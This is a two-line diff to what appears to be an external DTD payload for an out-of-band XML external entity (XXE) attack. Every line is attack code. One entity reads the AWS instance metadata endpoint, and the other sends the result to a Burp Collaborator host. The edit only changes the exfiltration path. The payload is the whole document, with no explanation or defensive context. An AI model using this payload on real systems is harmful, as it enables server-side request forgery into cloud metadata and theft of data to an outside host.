@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/hostname">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://u1w0qu2lgl5if9j34sloe5r1hsnjsfi37.burpcollaborator.net/?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://u1w0qu2lgl5if9j34sloe5r1hsnjsfi37.burpcollaborator.net/aws-hn?%file;'>">
